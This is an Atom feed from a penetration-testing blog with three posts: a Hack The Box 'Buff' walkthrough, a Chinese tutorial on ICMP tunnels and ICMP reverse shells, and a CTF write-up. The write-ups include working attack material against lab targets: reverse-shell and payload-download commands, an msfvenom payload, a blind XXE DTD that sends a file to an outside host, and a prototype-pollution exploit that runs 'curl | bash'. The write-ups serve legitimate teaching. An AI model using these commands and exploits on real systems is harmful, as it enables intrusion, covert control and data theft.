<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>SNCKER&#39;s blog</title>
  
  <subtitle>想要做开发但是又不会堆利用的渗透菜鸟</subtitle>
  <link href="https://sncker.github.io/blog/atom.xml" rel="self"/>
  
  <link href="https://sncker.github.io/blog/"/>
  <updated>2020-12-23T13:14:59.861Z</updated>
  <id>https://sncker.github.io/blog/</id>
  
  <author>
    <name>SNCKER</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>[HTB]Buff walkthrough</title>
    <link href="https://sncker.github.io/blog/2020/10/28/HTB-Buff-walkthrough/"/>
    <id>https://sncker.github.io/blog/2020/10/28/HTB-Buff-walkthrough/</id>
    <published>2020-10-28T08:44:00.000Z</published>
    <updated>2020-12-23T13:14:59.861Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://gitee.com/sncker/resource/raw/master/image/20201028165633.png" alt=""></p><a id="more"></a><p>Although the box is rated as easy, it took me a lot of time.<br>I think there is something wrong with my port forwarding, but I finally managed to get root, which is something to celebrate.  </p><h1 id="0x00-Information-collection"><a href="#0x00-Information-collection" class="headerlink" title="0x00 Information collection"></a>0x00 Information collection</h1><p>Using NAMP, it is easy to see that the target host has port 8080 open.<br><code>namp -sS 10.10.10.198</code>  </p><p>A Web service runs on it.<br>Visit this website. We can know from <code>10.10.10.198:8080/contact.php</code> that this website uses <code>Gym Management Software 1.0</code><br><img src="https://gitee.com/sncker/resource/raw/master/image/20201028163255.png" alt="">  </p><h1 id="0x01-Own-user"><a href="#0x01-Own-user" class="headerlink" title="0x01 Own user"></a>0x01 Own user</h1><p>We can find out the Unauthenticated RCE vulnerability in this webapp by searching on exploits-db.<br><a href="https://www.exploit-db.com/exploits/48506">https://www.exploit-db.com/exploits/48506</a><br>Download this script. And run<code>python rce.py 10.10.10.198:8080</code>. We can get a webshell.<br><img src="https://gitee.com/sncker/resource/raw/master/image/20201028162910.png" alt=""><br>With this webshell, we are easy to own user by using this payload.<br><code>type %userprofile%\desktop\user.txt</code><br><img src="https://gitee.com/sncker/resource/raw/master/image/20201028162320.png" alt=""></p><h1 id="0x02-Own-root"><a href="#0x02-Own-root" class="headerlink" title="0x02 Own root"></a>0x02 Own root</h1><p>At this point, we usually use some tools to collect system information to find the vulnerability of privilege escalation.<br>It’s a complicated job, and I won’t write it down.  </p><p>I first run <code>netstat -ano</code> to see what ports the system is open to.<br><img src="https://gitee.com/sncker/resource/raw/master/image/20201028163613.png" alt=""><br>I found that port 8888 is only available locally.Then I found the process by the PID.<br><img src="https://gitee.com/sncker/resource/raw/master/image/20201028163649.png" alt=""><br>Search <code>cloudme</code> on exploits-db.<br>A vulnerability was found in remote command execution due to buffer overflow.<br><a href="https://www.exploit-db.com/exploits/48389">https://www.exploit-db.com/exploits/48389</a><br>To use this script, we need to forward port 8888.  </p><p>Set up a simple HTTP server with Python, and use webshell’s curl to download some tools to the victim machine.<br>Run <code>python3 -m http.server</code> to set up a HTTP server.<br>Then run<code>curl -O 10.10.15.91:8000/nc.exe</code> and <code>curl -O 10.10.15.91:8000/chisel.exe</code> on webshell.<br><img src="https://gitee.com/sncker/resource/raw/master/image/20201028162747.png" alt=""></p><p>Get the reverse shell through nc.<br>Run <code>nc -lvp 6666</code> to listening.<br>Run <code>nc -e cmd.exe 10.10.15.91 6666</code> on webshell.  </p><p>Next step. We run <code>./chisel server -port 8080 --reverse</code> to create the Chisel server side.<br>And, run <code>chisel.exe client 10.10.15.91:8080 R:8888:127.0.0.1:8888</code> on reverse shell.<br><img src="https://gitee.com/sncker/resource/raw/master/image/20201028162834.png" alt=""><br><img src="https://gitee.com/sncker/resource/raw/master/image/20201028162806.png" alt=""><br>So we can forward port 8888 through this reverse tunnel.  </p><p>Then run <code>msfvenom -p windows/exec CMD=&#39;C:\xampp\htdocs\gym\upload\nc.exe -e cmd.exe 10.10.15.91 1999&#39; -b &#39;\x00\x0A\x0D&#39; -f python -v payload</code> to generate our payload.<br><img src="https://gitee.com/sncker/resource/raw/master/image/20201028163108.png" alt="">  </p><p>And then replace the payload in the POC script.<br>Run <code>nc -lvp 1999</code> and run the srcript. We can get a administrator shell from nc listening.<br><img src="https://gitee.com/sncker/resource/raw/master/image/20201028163144.png" alt=""></p><p>If you are an international friend and have seen my article.First of all, I’d like to thank you for coming, and then I hope you will forgive me for this Chinglish. Just for fun :)</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://gitee.com/sncker/resource/raw/master/image/20201028165633.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://sncker.github.io/blog/categories/CTF/"/>
    
    <category term="WriteUp" scheme="https://sncker.github.io/blog/categories/CTF/WriteUp/"/>
    
    
    <category term="HTB" scheme="https://sncker.github.io/blog/tags/HTB/"/>
    
    <category term="Buff" scheme="https://sncker.github.io/blog/tags/Buff/"/>
    
    <category term="HackTheBox" scheme="https://sncker.github.io/blog/tags/HackTheBox/"/>
    
    <category term="Pentest" scheme="https://sncker.github.io/blog/tags/Pentest/"/>
    
  </entry>
  
  <entry>
    <title>初探ICMP隧道</title>
    <link href="https://sncker.github.io/blog/2020/10/15/%E5%88%9D%E6%8E%A2ICMP%E9%9A%A7%E9%81%93/"/>
    <id>https://sncker.github.io/blog/2020/10/15/%E5%88%9D%E6%8E%A2ICMP%E9%9A%A7%E9%81%93/</id>
    <published>2020-10-15T09:37:00.000Z</published>
    <updated>2020-10-15T15:47:10.391Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://gitee.com/sncker/resource/raw/master/image/20201015175947.png" alt=""><br>ICMP隧道也不是什么新奇的技术了，但是在某些渗透测试场景下可以说是一种挺骚的操作，其产生的畸形网络流量可以用于逃避防火墙的规则，这里仅拿两种应用方式演示，不具体讨论ICMP协议，还不知道ICMP是啥的可以先百度了解一下。  </p><a id="more"></a><h1 id="ICMP隧道传输"><a href="#ICMP隧道传输" class="headerlink" title="ICMP隧道传输"></a>ICMP隧道传输</h1><h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><p>客户端IP:192.168.10.234 (kali linux)<br>服务端IP:192.168.10.107 (kali linux)  </p><p>用到icmptunnel这款工具<br><code>git clone https://github.com/DhavalKapil/icmptunnel</code></p><h2 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h2><p>编译工具<code>make</code><br>启动隧道<code>icmptunnel -s 10.0.1.1</code>(下图ip打错了)<br><img src="https://gitee.com/sncker/resource/raw/master/image/20201014205156.png" alt=""><br>可以发现变化路由表的变化<code>route -n</code><br><img src="https://gitee.com/sncker/resource/raw/master/image/20201014205430.png" alt=""></p><h2 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h2><p>编译工具<code>make</code><br>修改<code>client.sh</code><br><img src="https://gitee.com/sncker/resource/raw/master/image/20201015181844.png" alt=""><br><code>server</code>服务端ip,<code>gateway</code>网关,<code>interface</code>对应网卡接口。<br>如这里改为<code>route add -host 192.168.10.107 gw 192.168.10.1 dev eth0</code><br>建立隧道<code>icmptunnel -c 192.168.10.107</code><br><img src="https://gitee.com/sncker/resource/raw/master/image/20201014214857.png" alt=""><br>此时可以看到路由表的变化<code>route -n</code><br><img src="https://gitee.com/sncker/resource/raw/master/image/20201014215040.png" alt=""><br>可以发现出去的流量都走这个隧道。<br>开百度测试了一下，速度还可以接受，同时进行抓包。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20201014220221.png" alt=""><br>可以看到icmp包异常的多，且长度也很长，有些还可以看到有http的请求信息。  </p><hr><p><strong>总体架构</strong><br>搬一下作者的架构图</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">+--------------+                                    +------------+                 +------------+</span><br><span class="line">|              |  IP traffic  +------+  IP traffic  |            |   ICMP traffic  |            |  IP traffic     +------+       NAT&#x2F;Masquerading </span><br><span class="line">|     User     |  ---------&gt;  | tun0 |  ---------&gt;  | icmptunnel | ---------------&gt;| icmptunnel | ------------&gt;   | tun0 |    ---------------------&gt; </span><br><span class="line">| Applications |  &lt;---------  +------+  &lt;---------  |  program   | &lt;---------------|  program   | &lt;------------   +------+    &lt;---------------------</span><br><span class="line">|              |        (Virtual Interface)         | (client)   |    restricted   | (server)   |           (Virtual Interface)   proper internet</span><br><span class="line">+--------------+                                    +------------+     internet    +------------+</span><br></pre></td></tr></table></figure><h1 id="ICMP隧道命令控制–反向shell"><a href="#ICMP隧道命令控制–反向shell" class="headerlink" title="ICMP隧道命令控制–反向shell"></a>ICMP隧道命令控制–反向shell</h1><p>将攻击payload放在icmp报文中能达到很好的隐藏效果。  </p><h2 id="测试环境-1"><a href="#测试环境-1" class="headerlink" title="测试环境"></a>测试环境</h2><p>攻击机IP:192.168.10.234 (kali linux)<br>受害机IP:192.168.10.155 (windows10)</p><p>用到icmpsh这款工具<br><code>git clone https://github.com/inquisb/icmpsh.git</code></p><h2 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h2><p><strong>攻击机</strong>执行<code>sysctl -w net.ipv4.icmp_echo_ignore_all=1</code>关闭ping回复，防止内核响应ping包，否则可能接收不到完整的回传数据。<br>然后监听即可<code>python icmpsh_m.py 192.168.10.234 192.168.10.155</code><br>和一般的反弹shell不一样的是需要指定目标的ip。  </p><p><strong>受害机</strong>执行<code>icmpsh.exe -t 192.168.10.155</code>即可。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20201015171940.png" alt=""></p><p>同样的可以看到通信的数据都在icmp包中。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20201015172133.png" alt=""><br>测试过程中，受害主机是开着管家的，没有任何的风险提示，可以看到隐蔽性是很好的。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://gitee.com/sncker/resource/raw/master/image/20201015175947.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;ICMP隧道也不是什么新奇的技术了，但是在某些渗透测试场景下可以说是一种挺骚的操作，其产生的畸形网络流量可以用于逃避防火墙的规则，这里仅拿两种应用方式演示，不具体讨论ICMP协议，还不知道ICMP是啥的可以先百度了解一下。  &lt;/p&gt;</summary>
    
    
    
    <category term="网络渗透" scheme="https://sncker.github.io/blog/categories/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="计算机网络" scheme="https://sncker.github.io/blog/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
    <category term="隧道技术" scheme="https://sncker.github.io/blog/tags/%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/"/>
    
    <category term="隐蔽通信" scheme="https://sncker.github.io/blog/tags/%E9%9A%90%E8%94%BD%E9%80%9A%E4%BF%A1/"/>
    
    <category term="权限维持" scheme="https://sncker.github.io/blog/tags/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"/>
    
  </entry>
  
  <entry>
    <title>2020网鼎杯-WriteUp</title>
    <link href="https://sncker.github.io/blog/2020/09/25/2020-%E7%BD%91%E9%BC%8E%E6%9D%AF-WriteUp/"/>
    <id>https://sncker.github.io/blog/2020/09/25/2020-%E7%BD%91%E9%BC%8E%E6%9D%AF-WriteUp/</id>
    <published>2020-09-25T01:48:00.000Z</published>
    <updated>2020-09-25T10:29:59.521Z</updated>
    
    <content type="html"><![CDATA[<p>青龙组的题。老烂尾文章了，复盘一下。  </p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="filejava"><a href="#filejava" class="headerlink" title="filejava"></a>filejava</h2><p>一道XXE的题目。<br>先看到个上传功能，传完可以下载。<br>在下载功能点存在任意文件下载漏洞。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200925173410.png" alt=""></p><a id="more"></a><p>当参数是个文件夹时还爆路径。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200925173540.png" alt=""><br>然后直接读<code>web.xml</code>文件。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200925173639.png" alt=""><br>利用任意下载漏洞把class文件都下载下来。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?filename&#x3D;..&#x2F;..&#x2F;..&#x2F;classes&#x2F;cn&#x2F;abc&#x2F;servlet&#x2F;DownloadServlet.class</span><br><span class="line">?filename&#x3D;..&#x2F;..&#x2F;..&#x2F;classes&#x2F;cn&#x2F;abc&#x2F;servlet&#x2F;ListFileServlet.class</span><br><span class="line">?filename&#x3D;..&#x2F;..&#x2F;..&#x2F;classes&#x2F;cn&#x2F;abc&#x2F;servlet&#x2F;UploadServlet.class</span><br></pre></td></tr></table></figure><p>反编译class进行代码审计。<br>下载功能中有个检测，防止直接下载flag文件。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200925174605.png" alt=""><br>在上传功能中会用<code>apache poi</code>库对<code>excel-</code>开头格式的xlsx文件进行处理。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200925175027.png" alt=""><br>在报错处理里提示了<code>poi</code>库版本为<code>3.10</code>，爆了个<code>CVE-2014-3529</code>，存在XXE漏洞。<br><strong>漏洞利用：</strong><br>新建xlsx文件名字以<code>excel-</code>开头，用解压软件打开，在<code>[Content_Types].xml</code>文件引入一个dtd（这里盲打，需要将flag打回服务器）。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200924200807.png" alt=""><br>dtd内容：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///flag&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">getfile</span> <span class="meta-string">&quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://frps:12020?f=%file;&#x27;&gt;&quot;</span>&gt;</span></span><br><span class="line">%getfile;</span><br><span class="line">%send;</span><br></pre></td></tr></table></figure><p>开http服务，nc监听，一气呵成，然后上传xlsx文件。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200924200408.png" alt=""></p><h2 id="Notes"><a href="#Notes" class="headerlink" title="Notes"></a>Notes</h2><p>一道nodejs的原型链污染。<br>直接给了源码，这里贴一下关键点。  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> undefsafe = <span class="built_in">require</span>(<span class="string">&#x27;undefsafe&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; exec &#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Notes</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.owner = <span class="string">&quot;whoknows&quot;</span>;</span><br><span class="line">        <span class="built_in">this</span>.num = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">this</span>.note_list = &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="title">get_note</span>(<span class="params">id</span>)</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> r = &#123;&#125;</span><br><span class="line">        undefsafe(r, id, undefsafe(<span class="built_in">this</span>.note_list, id));</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="title">edit_note</span>(<span class="params">id, author, raw</span>)</span> &#123;</span><br><span class="line">        undefsafe(<span class="built_in">this</span>.note_list, id + <span class="string">&#x27;.author&#x27;</span>, author);</span><br><span class="line">        undefsafe(<span class="built_in">this</span>.note_list, id + <span class="string">&#x27;.raw_note&#x27;</span>, raw);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> notes = <span class="keyword">new</span> Notes();</span><br><span class="line"></span><br><span class="line">app.route(<span class="string">&#x27;/edit_note&#x27;</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        res.render(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;please use POST to edit a note&quot;</span>&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> id = req.body.id;</span><br><span class="line">        <span class="keyword">let</span> author = req.body.author;</span><br><span class="line">        <span class="keyword">let</span> enote = req.body.raw;</span><br><span class="line">        <span class="keyword">if</span> (id &amp;&amp; author &amp;&amp; enote) &#123;</span><br><span class="line">            notes.edit_note(id, author, enote);</span><br><span class="line">            res.render(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;edit note sucess&quot;</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.render(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;edit note failed&quot;</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(<span class="string">&#x27;/status&#x27;</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> commands = &#123;</span><br><span class="line">            <span class="string">&quot;script-1&quot;</span>: <span class="string">&quot;uptime&quot;</span>,</span><br><span class="line">            <span class="string">&quot;script-2&quot;</span>: <span class="string">&quot;free -m&quot;</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> index <span class="keyword">in</span> commands) &#123;</span><br><span class="line">            exec(commands[index], &#123;<span class="attr">shell</span>:<span class="string">&#x27;/bin/bash&#x27;</span>&#125;, <span class="function">(<span class="params">err, stdout, stderr</span>) =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (err) &#123;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">`stdout: <span class="subst">$&#123;stdout&#125;</span>`</span>);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        res.send(<span class="string">&#x27;OK&#x27;</span>);</span><br><span class="line">        res.end();</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> port = <span class="number">8080</span>;</span><br><span class="line">app.listen(port, <span class="function">() =&gt;</span> <span class="built_in">console</span>.log(<span class="string">`Example app listening at http://localhost:<span class="subst">$&#123;port&#125;</span>`</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>引了<code>undefsafe</code>模块。<code>CVE-2019-10795</code>爆的<code>2.0.3</code>以下低版本存在原型链污染漏洞。</p><p>先找模块引用点。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200924113411.png" alt=""></p><p>查看路由知道在<code>edit_note</code>中我们可以控制<code>undefsafe</code>的2,3参数，那么就可以触发原型链污染漏洞。<br>接下来就要查找利用点，在<code>/status</code>路由中有命令执行的地方，命令是预先定义好然后通过遍历逐个执行。<code>for...in...</code>会遍历原型链上的可枚举属性。那么我们可以通过污染字典原型来增加一个可控的可遍历属性，从而达到任意命令执行的目的。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200924114921.png" alt=""><br><strong>攻击过程解析：</strong><br><code>POST /edit_note</code>路由传入<code>id=__proto__.aaa&amp;author=&#123;command&#125;&amp;raw=111</code><br>函数就会访问<code>note_list</code>字典的属性<code>__proto__.aaa.author</code>。因为<code>aaa</code>是不存在的属性，所以最后函数会将<code>author</code>参数的值赋给<code>__proto__.author</code>从而在字典原型中添加了一个<code>author</code>属性。每个实例使用<code>for...in...</code>都会遍历到这个属性。<br>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Exp</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, url, command</span>):</span></span><br><span class="line">        self.url = url</span><br><span class="line">        self.command = command</span><br><span class="line">        self.pwn()</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">edit_note</span>(<span class="params">self, note_id, note_author, note_raw</span>):</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;id&#x27;</span>: note_id,</span><br><span class="line">            <span class="string">&#x27;author&#x27;</span>: note_author,</span><br><span class="line">            <span class="string">&#x27;raw&#x27;</span>: note_raw</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            requests.post(self.url + <span class="string">&#x27;/edit_note&#x27;</span>, data=data)</span><br><span class="line">            print(<span class="string">&quot;[+] edit note success.&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(<span class="string">&quot;[-] %s\n[-] edit note fail.&quot;</span>%(e))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">pwn</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.edit_note(<span class="string">&#x27;__proto__.aaa&#x27;</span>, self.command, <span class="string">&#x27;exp&#x27;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            requests.get(self.url + <span class="string">&#x27;/status&#x27;</span>)</span><br><span class="line">            print(<span class="string">&quot;[+] command executed.&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(<span class="string">&quot;[-] %s\n[-] command execution fails.&quot;</span>%(e))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    url = <span class="string">&quot;http://953895c7-9fbc-4bcd-8360-663f78b494c6.node3.buuoj.cn&quot;</span></span><br><span class="line">    command = <span class="string">&quot;curl frps:12021/script.sh | bash&quot;</span></span><br><span class="line">    exp = Exp(url, command)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/sncker/resource/raw/master/image/20200924193839.png" alt=""></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="you-raise-me-up"><a href="#you-raise-me-up" class="headerlink" title="you_raise_me_up"></a>you_raise_me_up</h2><p>题目  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">n = <span class="number">2</span> ** <span class="number">512</span></span><br><span class="line">m = random.randint(<span class="number">2</span>, n-<span class="number">1</span>) | <span class="number">1</span></span><br><span class="line">c = <span class="built_in">pow</span>(m, bytes_to_long(flag), n)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;m = &#x27;</span> + <span class="built_in">str</span>(m)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;c = &#x27;</span> + <span class="built_in">str</span>(c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># m = 391190709124527428959489662565274039318305952172936859403855079581402770986890308469084735451207885386318986881041563704825943945069343345307381099559075</span></span><br><span class="line"><span class="comment"># c = 6665851394203214245856789450723658632520816791621796775909766895233000234023642878786025644953797995373211308485605397024123180085924117610802485972584499</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>看主要式子</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c &#x3D; m^flag % n</span><br></pre></td></tr></table></figure><p><code>c, m, n</code>已知。求flag，就是求解离散对数问题。<br>可以用小步大步BSGS算法去解，Pohlig-Hellman算法貌似要特殊情况，没试过。<br>直接拿一个ACM用的C的模板溢出了，用python来实现也溢出了。<br>后来学到了一个科学计算库sympy。<br>利用里面的<code>discrete_log</code>，可以自动选择算法计算。<br>贴个官方文档<br><a href="https://docs.sympy.org/latest/modules/ntheory.html?highlight=discrete_log#sympy.ntheory.residue_ntheory.discrete_log">https://docs.sympy.org/latest/modules/ntheory.html?highlight=discrete_log#sympy.ntheory.residue_ntheory.discrete_log</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sympy.ntheory <span class="keyword">import</span> discrete_log</span><br><span class="line"></span><br><span class="line">n = <span class="number">2</span>**<span class="number">512</span></span><br><span class="line">m = <span class="number">391190709124527428959489662565274039318305952172936859403855079581402770986890308469084735451207885386318986881041563704825943945069343345307381099559075</span></span><br><span class="line">c = <span class="number">6665851394203214245856789450723658632520816791621796775909766895233000234023642878786025644953797995373211308485605397024123180085924117610802485972584499</span></span><br><span class="line">print(discrete_log(n,c,m))</span><br></pre></td></tr></table></figure><p>跑出来解码一下就行了。  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;5f95ca93-1594-762d-ed0b-a9139692cb4a&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;青龙组的题。老烂尾文章了，复盘一下。  &lt;/p&gt;
